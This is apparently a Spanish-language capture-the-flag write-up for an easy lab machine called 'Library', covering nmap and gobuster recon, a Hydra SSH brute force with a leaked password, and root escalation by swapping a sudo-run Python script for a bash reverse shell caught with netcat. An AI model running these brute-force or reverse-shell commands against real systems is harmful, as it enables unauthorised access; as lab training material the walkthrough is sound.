Maquina: Library

Autor: El Pinguino de Mario

Dificultad: Facil

![Screenshot 2024-11-10 095021](https://github.com/user-attachments/assets/e38d1e1a-0da2-4ea5-a81b-cf7971575d74)

ping 172.17.0.2 -c 1

![Screenshot 2024-11-10 095836](https://github.com/user-attachments/assets/9db11334-2771-4d53-ab1a-17d00925c294)

Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap

nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2

![Screenshot 2024-11-10 095920](https://github.com/user-attachments/assets/725ad915-97e0-4c3c-a84d-c9e296958b2d)

La pagina web no muestra nada 

![Screenshot 2024-11-10 095947](https://github.com/user-attachments/assets/f2bc7079-211a-4016-9003-d27d2e79a855)

Usamos Gobuster para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

Gobuster ha encontrado un index.php

![Screenshot 2024-11-10 100019](https://github.com/user-attachments/assets/ac1721d6-72fb-4827-a1ea-4b7cb711cef8)

Tenemos una posible contraseña

![Screenshot 2024-11-10 100105](https://github.com/user-attachments/assets/880b01ff-f418-40da-b046-af3e13f28644)

Vamos hacer fuerza bruta con hydra al protocolo ssh pasandole un diccionario de usuarios

hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2

Encontramos el usuario Carlos vamos a ingresar al SSH

![Screenshot 2024-11-10 102450](https://github.com/user-attachments/assets/6597bf51-3c46-46cc-a7e4-c3ad5ab12bd7)

ssh carlos@172.17.0.2

![Screenshot 2024-11-10 102612](https://github.com/user-attachments/assets/61f0bbdc-1200-4c8c-a07a-f2a99639a74e)

ejecutamos el comando sudo -l para ver si tenemos premisos especiales

![Screenshot 2024-11-10 102635](https://github.com/user-attachments/assets/39103abb-ceef-4f98-90c1-639d0c8c9892)

Vamos al directorio y listamos para ver los permisos

cd /opt
ls -la

![Screenshot 2024-11-10 102707](https://github.com/user-attachments/assets/f4394756-9704-471e-8df6-e32333be106c)

Lo que podemos cambiarle el nombre al archivo y crear otro con el mismo nombre pero que un su interior tenga lo siguiente

![Screenshot 2024-11-10 105158](https://github.com/user-attachments/assets/f42e0e52-6500-47c3-8983-94759edaf576)

nano scrip.py

![Screenshot 2024-11-10 104937](https://github.com/user-attachments/assets/b3c34445-b67c-464b-aa58-1525b6b81097)

import os

os.system("bash -c 'bash -i >& /dev/tcp/192.168.0.112/443 0>&1'")

![Screenshot 2024-11-10 104538](https://github.com/user-attachments/assets/0010f295-c6fa-43be-adc0-b86ca49e49e8)

nos ponemos a la escucha con netcat

sudo nc -lnvp 443

![Screenshot 2024-11-10 105037](https://github.com/user-attachments/assets/2197f416-5c25-4fa4-b4ed-1c1d08d30997)

ejecutamos la script con sudo

![Screenshot 2024-11-10 104943](https://github.com/user-attachments/assets/65f2f534-2a60-4584-abd1-7f27108e962c)

sudo /usr/bin/python3 /opt/script.py

whoami

![Screenshot 2024-11-10 105049](https://github.com/user-attachments/assets/e48198a5-c28b-43b1-86cc-f716940fe4c9)
